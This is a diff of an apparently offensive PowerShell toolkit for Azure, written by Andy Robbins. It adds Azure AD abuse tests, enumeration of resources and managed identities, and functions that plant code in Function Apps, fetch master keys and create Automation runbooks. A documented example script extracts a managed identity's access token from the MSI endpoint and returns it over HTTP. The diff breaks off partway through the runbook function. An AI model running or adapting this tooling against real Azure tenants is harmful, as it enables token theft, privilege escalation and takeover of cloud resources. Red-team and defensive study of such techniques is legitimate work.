@@ -4791,7 +5115,7 @@ Function Invoke-AllAzureADAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetSPId         "12b608c2-b9f8-4cd9-90d1-7b07691c2848" `
+            -TargetSPId         $ThreadSafeSP.SPObjectId `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
@@ -4803,7 +5127,7 @@ Function Invoke-AllAzureADAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetAppId        "c0a49525-8edb-47cd-b7c1-d522226645f0" `
+            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
@@ -4815,7 +5139,7 @@ Function Invoke-AllAzureADAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetGroupId      "354c6454-60b8-4690-9136-ce4e84a5c372" `
+            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
@@ -4827,7 +5151,31 @@ Function Invoke-AllAzureADAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetAppId        "c0a49525-8edb-47cd-b7c1-d522226645f0" `
+            -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
+            -TestToken          $ThreadSafeTestToken.access_token `
+            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+            -HeldPrivilege      $_.displayName `
+            -TestGUID           ${using:TestGUID} `
+            -TimeOfTest         $(Get-Date)
+        )
+        $LocalTestResult = $using:MGTestResults
+        $LocalTestResult.Add($ThreadSafeTest)
+
+        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
+            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+            -TestToken          $ThreadSafeTestToken.access_token `
+            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+            -HeldPrivilege      $_.displayName `
+            -TestGUID           ${using:TestGUID} `
+            -TimeOfTest         $(Get-Date)
+        )
+        $LocalTestResult = $using:MGTestResults
+        $LocalTestResult.Add($ThreadSafeTest)
+
+        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
+            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
@@ -4839,7 +5187,7 @@ Function Invoke-AllAzureADAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
             -TestPrincipalId $ThreadSafeSP.SPObjectId `
-            -TargetSPId         "aa7ff257-cd01-49a7-aab3-8c8b15294e8f" `
+            -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
@@ -5385,6 +5733,579 @@ Function Get-AllAzureRMVirtualMachines {
 
 }
 
+Function Get-AllAzureRMLogicApps {
+    <#
+    .SYNOPSIS
+        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves all JSON-formatted Azure RM Logic App objects under a particular subscription using the Azure management API
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability to list Logic Apps
+
+    .PARAMETER SubscriptionID
+        The unique identifier of the subscription you want to list Logic Apps under
+    
+    .EXAMPLE
+    C:\PS> $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
+    
+    Description
+    -----------
+    Uses the JWT in the $Token variable to list all Logic Apps under the subscription with ID starting with "839..." and put them into the $LogicApps variable
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $SubscriptionID
+    )
+
+    # Get all Logic Apps under a specified subscription
+    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Logic/workflows?api-version=2016-06-01"
+    $Results = $null
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $LogicAppObjects += $Results.value
+        } else {
+            $LogicAppObjects += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+
+    $LogicAppObjects
+
+}
+
+Function Get-AllAzureRMFunctionApps {
+    <#
+    .SYNOPSIS
+        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability to list Function Apps
+
+    .PARAMETER SubscriptionID
+        The unique identifier of the subscription you want to list Function Apps under
+    
+    .EXAMPLE
+    C:\PS> $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
+    
+    Description
+    -----------
+    Uses the JWT in the $Token variable to list all Function Apps under the subscription with ID starting with "839..." and put them into the $FunctionApps variable
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $SubscriptionID
+    )
+
+    # Get all Function Apps under a specified subscription
+    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Web/sites?api-version=2022-03-01"
+    $Results = $null
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $FunctionAppObjects += $Results.value
+        } else {
+            $FunctionAppObjects += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+
+    $FunctionAppObjects
+
+}
+
+Function Get-AllAzureRMAzureContainerRegistries {
+    <#
+    .SYNOPSIS
+        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves all JSON-formatted Azure RM Container Registry objects under a particular subscription using the Azure management API
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability to list Container Registries
+
+    .PARAMETER SubscriptionID
+        The unique identifier of the subscription you want to list Container Registries under
+    
+    .EXAMPLE
+    C:\PS> $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
+    
+    Description
+    -----------
+    Uses the JWT in the $Token variable to list all Container Registries under the subscription with ID starting with "839..." and put them into the $ContainerRegistries variable
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $SubscriptionID
+    )
+
+    # Get all Container Registries under a specified subscription
+    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.ContainerRegistry/registries?api-version=2019-05-01"
+    $Results = $null
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $ContainerRegistryObjects += $Results.value
+        } else {
+            $ContainerRegistryObjects += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+
+    $ContainerRegistryObjects
+
+}
+
+Function Get-AllAzureRMAutomationAccounts {
+    <#
+    .SYNOPSIS
+        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves all JSON-formatted Automation Accounts under a particular subscription using the Azure management API
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability to list Automation Accounts
+
+    .PARAMETER SubscriptionID
+        The unique identifier of the subscription you want to list Automation Accounts under
+    
+    .EXAMPLE
+    C:\PS> $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
+    
+    Description
+    -----------
+    Uses the JWT in the $Token variable to list all Automation Accounts under the subscription with ID starting with "839..." and put them into the $AutomationAccounts variable
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $SubscriptionID
+    )
+
+    # Get all Automation Accounts under a specified subscription
+    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Automation/automationAccounts?api-version=2021-06-22"
+    $Results = $null
+    do {
+        $Results = Invoke-RestMethod `
+            -Headers @{
+                Authorization = "Bearer $($Token)"
+            } `
+            -URI $URI `
+            -UseBasicParsing `
+            -Method "GET" `
+            -ContentType "application/json"
+        if ($Results.value) {
+            $AutomationAccountObjects += $Results.value
+        } else {
+            $AutomationAccountObjects += $Results
+        }
+        $uri = $Results.'@odata.nextlink'
+    } until (!($uri))
+
+    $AutomationAccountObjects
+
+}
+
+Function Get-AllAzureManagedIdentityAssignments {
+    <#
+    .SYNOPSIS
+        Scans all supported Azure resource types for managed identity assignments
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Scans all supported Azure resource types for managed identity assignments. Supported resource types
+        include Virtual Machines, Logic Apps, Function Apps, ACR Tasks, and Automation Accounts. Depending
+        on the resource type, managed identity assignments will include system-assigned, user-assigned, and
+        Run As accounts.
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability read all of the above-mentioned Azure resource types
+
+    .PARAMETER SubscriptionID
+        The unique identifier of the subscription you want to scan for Managed Identity assignments
+    
+    .EXAMPLE
+    C:\PS> $ManagedIdentityAssignments = Get-AllAzureManagedIdentityAssignments -Token $Token -SubscriptionID "839df4bc-5ac7-441d-bb5d-26d34bca9ea4"
+    
+    Description
+    -----------
+    Uses the JWT in the $Token variable to scan the "839..." subscription for all Azure resources with managed identity assignments
+    
+    .LINK
+        https://medium.com/p/74aee1006f48
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $SubscriptionID
+    )
+
+    # Get all VMs
+    $VirtualMachines = Get-AllAzureRMVirtualMachines -Token $Token -SubscriptionID $SubscriptionID
+
+    # Get all Logic Apps
+    $LogicApps = Get-AllAzureRMLogicApps -Token $Token -SubscriptionID $SubscriptionID
+
+    # Get all Function Apps
+    $FunctionApps = Get-AllAzureRMFunctionApps -Token $Token -SubscriptionID $SubscriptionID
+
+    # Get all ACRs
+    $ContainerRegistries = Get-AllAzureRMAzureContainerRegistries -Token $Token -SubscriptionID $SubscriptionID
+
+    # Get all Automation Accounts
+    $AutomationAccounts = Get-AllAzureRMAutomationAccounts -Token $Token -SubscriptionID $SubscriptionID
+
+    # Process Virtual Machines
+    $VirtualMachines | %{
+        $VM = $_
+    
+        # Output an object if there is a system-assigned managed identity:
+        If ($VM.identity.principalId -eq $null) {
+        } else {
+    
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Virtual Machine"
+                ManagedIdentityType = "System Assigned"
+                ResourceName        = $VM.name
+                ResourceID          = $VM.id
+                ServicePrincipalID  = $VM.identity.principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    
+        # Virtual Machines can have multiple user-assigned managed identity assignments.
+        # Output one object per user-assigned managed identity:
+        If ($VM.identity.userAssignedIdentities -eq $null) {
+        } else {
+            # Count how many user-assigned identities there are:
+            $UserAssignedIdentityCount = ($VM.identity.userAssignedIdentities.PSObject.Properties | measure).Count
+    
+            # Loop through the VM object for the number of user assigned identities there are:
+            1..$UserAssignedIdentityCount | %{
+                $CurrentInteger = $_
+    
+                $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                    ResourceType        = "Virtual Machine"
+                    ManagedIdentityType = "User Assigned"
+                    ResourceName        = $VM.name
+                    ResourceID          = $VM.id
+                    ServicePrincipalID  = ($VirtualMachines.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
+                }
+    
+            $ManagedIdentityAssignment
+    
+            }
+        }
+    }
+    
+    # Process Logic Apps
+    $LogicApps | %{
+        $LogicApp = $_
+    
+        # Output an object if there is a system-assigned managed identity:
+        If ($LogicApp.identity.principalId -eq $null) {
+        } else {
+    
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Logic App"
+                ManagedIdentityType = "System Assigned"
+                ResourceName        = $LogicApp.name
+                ResourceID          = $LogicApp.id
+                ServicePrincipalID  = $LogicApp.identity.principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    
+        # Logic Apps can only have one managed identity assignment at a time
+        # Output an if there is a user-assigned managed identity:
+        If ($LogicApp.identity.userAssignedIdentities -eq $null) {
+        } else {
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Logic App"
+                ManagedIdentityType = "User Assigned"
+                ResourceName        = $LogicApp.name
+                ResourceID          = $LogicApp.id
+                ServicePrincipalID  = ($LogicApp.identity.userAssignedIdentities.PSObject.Properties | select -expand Value).principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    }
+    
+    # Process Function Apps
+    $FunctionApps | %{
+        $FunctionApp = $_
+    
+        # Output an object if there is a system-assigned managed identity:
+        If ($FunctionApp.identity.principalId -eq $null) {
+        } else {
+    
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Function App"
+                ManagedIdentityType = "System Assigned"
+                ResourceName        = $FunctionApp.name
+                ResourceID          = $FunctionApp.id
+                ServicePrincipalID  = $FunctionApp.identity.principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    
+        # Function Apps can have multiple user-assigned managed identity assignments.
+        # Output one object per user-assigned managed identity:
+        If ($FunctionApp.identity.userAssignedIdentities -eq $null) {
+        } else {
+            # Count how many user-assigned identities there are:
+            $UserAssignedIdentityCount = ($FunctionApp.identity.userAssignedIdentities.PSObject.Properties | measure).Count
+    
+            # Loop through the FunctionApp object for the number of user assigned identities there are:
+            1..$UserAssignedIdentityCount | %{
+                $CurrentInteger = $_
+    
+                $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                    ResourceType        = "Function App"
+                    ManagedIdentityType = "User Assigned"
+                    ResourceName        = $FunctionApp.name
+                    ResourceID          = $FunctionApp.id
+                    ServicePrincipalID  = ($FunctionApps.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+            }
+        }
+    }
+    
+    # Process Container Registries
+    $ContainerRegistries | %{
+        $ContainerRegistry = $_
+    
+        # The original CR object doesn't contain MI assignments, we need to make another API request per CR to get those:
+        $ContainerRegistryManagedIdentities = (
+            Invoke-WebRequest -UseBasicParsing -Uri "https://management.azure.com/api/invoke" `
+                -Headers @{
+                    "Authorization"="Bearer $($Token)"
+                    "x-ms-path-query"="$($ContainerRegistry.id)?api-version=2020-11-01-preview"
+                } `
+                -ContentType "application/json"
+        ).Content | ConvertFrom-JSON
+    
+        # Output an object if there is a system-assigned managed identity:
+        If ($ContainerRegistryManagedIdentities.identity.principalId -eq $null) {
+        } else {
+    
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Container Registry"
+                ManagedIdentityType = "System Assigned"
+                ResourceName        = $ContainerRegistry.name
+                ResourceID          = $ContainerRegistry.id
+                ServicePrincipalID  = $ContainerRegistryManagedIdentities.identity.principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    
+        # Container Registries can have multiple user-assigned managed identity assignments.
+        # Output one object per user-assigned managed identity:
+        If ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities -eq $null) {
+        } else {
+            # Count how many user-assigned identities there are:
+            $UserAssignedIdentityCount = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | measure).Count
+    
+            # Loop through the ContainerRegistryManagedIdentities object for the number of user assigned identities there are:
+            1..$UserAssignedIdentityCount | %{
+                $CurrentInteger = $_
+    
+                $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                    ResourceType        = "Container Registry"
+                    ManagedIdentityType = "User Assigned"
+                    ResourceName        = $ContainerRegistry.name
+                    ResourceID          = $ContainerRegistry.id
+                    ServicePrincipalID  = ($ContainerRegistryManagedIdentities.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+            }
+        }
+    }
+    
+    # Process Automation Accounts
+    $AutomationAccounts | %{
+        $AutomationAccount = $_
+    
+        # Output an object if there is a system-assigned managed identity:
+        If ($AutomationAccount.identity.principalId -eq $null) {
+        } else {
+    
+            $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                ResourceType        = "Automation Account"
+                ManagedIdentityType = "System Assigned"
+                ResourceName        = $AutomationAccount.name
+                ResourceID          = $AutomationAccount.id
+                ServicePrincipalID  = $AutomationAccount.identity.principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+        }
+    
+        # Automation Accounts can have multiple user-assigned managed identity assignments.
+        # Output one object per user-assigned managed identity:
+        If ($AutomationAccount.identity.userAssignedIdentities -eq $null) {
+        } else {
+            # Count how many user-assigned identities there are:
+            $UserAssignedIdentityCount = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | measure).Count
+    
+            # Loop through the AutomationAccount object for the number of user assigned identities there are:
+            1..$UserAssignedIdentityCount | %{
+                $CurrentInteger = $_
+    
+                $ManagedIdentityAssignment = New-Object PSObject -Property @{
+                    ResourceType        = "Automation Account"
+                    ManagedIdentityType = "User Assigned"
+                    ResourceName        = $AutomationAccount.name
+                    ResourceID          = $AutomationAccount.id
+                    ServicePrincipalID  = ($AutomationAccount.identity.userAssignedIdentities.PSObject.Properties | Select-Object -First $CurrentInteger | Select-Object -Last 1 | select -expand Value).principalId
+            }
+    
+            $ManagedIdentityAssignment
+    
+            }
+        }
+    }
+
+}
+
 Function ConvertTo-Markdown {
     <#
     .Synopsis
@@ -5452,4 +6373,698 @@ Function ConvertTo-Markdown {
             $values -join ' | '
         }
     }
+}
+
+Function New-PowerShellFunctionAppFunction {
+    <#
+    .SYNOPSIS
+        Create a new function in an existing Function App. The function must be a PowerShell formatted script.
+
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+
+    .DESCRIPTION
+        Create a new function in an existing Function App
+
+    .PARAMETER Token
+        The AzureRM-scoped JWT for principal with the ability to add a function to the target function app
+
+    .PARAMETER PathToFunctionApp
+        The full URI path to the target function app
+
+    .PARAMETER FunctionName
+        The name of the new function you are adding to the function app
+
+    .PARAMETER PowerShellScript
+        The PowerShell script you want the new function to execute
+
+    .EXAMPLE
+        C:\PS> $Script = '
+            using namespace System.Net
+            param($Request, $TriggerMetadata)
+            $resourceURI = "https://graph.microsoft.com/"
+            $tokenAuthURI = $env:MSI_ENDPOINT + "?resource=$resourceURI&api-version=2017–09–01"
+            $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI
+            Push-OutputBinding -Name Response -Value ([HttpResponseContext]@{
+            StatusCode = [HttpStatusCode]::OK
+            Body = $tokenResponse
+        })
+        '
+
+        C:\PS> New-PowerShellFunctionAppFunction `
+            -Token $ServicePrincipalBToken `
+            -PathToFunctionApp "https://management.azure.com/subscriptions/bf510275-8a83-4932-988f-1b148b83f832/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp" `
+            -FunctionName "NewFunction3" `
+            -PowerShellScript $Script 
+
+        Description
+        -----------
+        Add a function to "MyCoolFunctionApp" which will extract a JWT for the function app's managed identity service principal
+
+    .LINK
+        https://medium.com/p/300065251cbe
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $PathToFunctionApp,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $FunctionName,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $PowerShellScript
+    )
+
+    $URI = "$($PathToFunctionApp)/functions/$($FunctionName)?api-version=2018-11-01"
+    
+    $Body = @{
+        id = "$($PathToFunctionApp)/functions/$($FunctionName)"
+        properties = @{
+            name = $FunctionName
+            files = @{
+                "run.ps1" = $PowerShellScript
+            }
+            test_data = "asdf"
+            config = @{
+                bindings = @(
+                    @{
+                        authLevel = "function"
+                        type = "httpTrigger"
+                        direction = "in"
+                        name = "Request"
+                        methods = @(
+                            "get"
+                            "post"
+                        )
+                    }
+                    @{
+                        type = "http"
+                        direction = "out"
+                        name = "Response"
+                    }
+                )
+            }
+        }
+    } | ConvertTo-Json -Depth 5
+   
+    Try {
+        $CreateFunction = Invoke-RestMethod `
+            -Method PUT `
+            -URI $URI `
+            -Body $Body `
+            -Headers @{
+                "authorization"="Bearer $($Token)"
+            } `
+            -ContentType "application/json"
+        $Success = $True
+    }
+    Catch {
+        $_
+    }
+}
+
+Function Get-AzureFunctionAppMasterKeys {
+    <#
+    .SYNOPSIS
+        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves all JSON-formatted Azure RM Function App objects under a particular subscription using the Azure management API
+    
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the user with the ability to list Function App master keys
+
+    .PARAMETER PathToFunctionApp
+        The full URL path to the function app
+
+    .EXAMPLE
+        Get-AzureFunctionAppMasterKeys `
+            -Token $ARMToken `
+            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"
+
+        Retrieve the master key for "MyCoolFunctionApp"
+
+    .LINK
+        https://medium.com/p/300065251cbe
+
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $PathToFunctionApp
+    )
+
+    # Get the Master Key for the specified Function App
+    $Request = Invoke-WebRequest -URI "$($PathToFunctionApp)/host/default/listkeys?api-version=2018-11-01" `
+        -Method "POST" `
+        -Headers @{
+            "Authorization"="Bearer $($Token)"
+        } 
+        
+        $FunctionAppMasterKey = ($Request.Content | ConvertFrom-JSON).masterKey
+
+    $FunctionAppMasterKey
+
+}
+
+Function Get-AzureFunctionOutput {
+    <#
+    .SYNOPSIS
+        Retrieves the output of a specified Function App function
+    
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+    
+    .DESCRIPTION
+        Retrieves the output of a specified Function App function
+    
+    .PARAMETER FunctionKey
+        The function-specific key or function app master key
+
+    .PARAMETER FunctionURL
+        The full URL path to the function app function
+
+    .EXAMPLE
+        Get-AzureFunctionOutput `
+            -FunctionKey $FunctionAppMasterKey `
+            -PathToFunctionApp "https://management.azure.com/subscriptions/f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf/resourceGroups/BHE_SpecterDev_FA_RG/providers/Microsoft.Web/sites/MyCoolFunctionApp"
+
+        Trigger and get output from MyCoolFunctionApp
+
+    .LINK
+        https://medium.com/p/300065251cbe
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $FunctionKey,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $FunctionURL
+    )
+
+    # Get the Master Key for the specified Function App
+    $Request = Invoke-WebRequest -URI "$($FunctionURL)?code=$($FunctionKey)" `
+        -Method "GET"
+
+    $Request.Content
+
+}
+
+Function New-AzureAutomationAccountRunBook {
+    <#
+    .SYNOPSIS
+        Add a runbook to an existing Automation Account
+
+        Author: Andy Robbins (@_wald0)
+        License: GPLv3
+        Required Dependencies: None
+
+    .DESCRIPTION
+        Add a runbook to an existing Automation Account
+
+    .PARAMETER Token
+        The AzureRM-scoped JWT for the test principal
+
+    .PARAMETER RunBookName
+        The name you want to give to the new runbook
+
+    .PARAMETER AutomationAccountPath
+        TThe full URL path to the Automation Account
+
+    .EXAMPLE
+        C:\PS> New-AzureAutomationAccountRunBook `
+            -Token $ARMToken `
+            -RunBookName "MyCoolRunBook" `
+            -AutomationAccountPath "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
+
+        Description
+        -----------
+        Publish a new runbook to an existing automation account called "MyCoolAutomationAccount"
+
+    .LINK
+        https://medium.com/p/74aee1006f48
+        https://docs.microsoft.com/en-us/azure/role-based-access-control/role-assignments-rest
+    #>
+    [CmdletBinding()] Param (
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Token,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $AutomationAccountPath,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $RunBookName,
+
+        [Parameter(
+            Mandatory = $True,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $Script
+    )
+    
+    Try {
+        $RequestGUID = ([GUID]::NewGuid()).toString()
+        $body = @{
+            requests = @(
+                @{
+                    content = @{
+                        name = $RunBookName
+                        location = "eastus"
+                        properties = @{
+                            runbookType = "PowerShell7"
+                            description = "asdf"
+                            logProgress = "false"
+                            logVerbose = "false"
+                            draft = @{}
+                        }
+                    }
+                    httpMethod = "PUT"
+                    name = $RequestGUID
+                    requestHeaderDetails = @{
+                        commandName = "Microsoft_Azure_Automation."
+                    }
+                    url = "$($AutomationAccountPath)/runbooks/$($RunBookName)?api-version=2017-05-15-preview"
+                }
+            )
+        }
+        $CreateDraft = Invoke-RestMethod `
+            -Uri "https://management.azure.com/batch?api-version=2020-06-01" `
+            -Method "POST" `
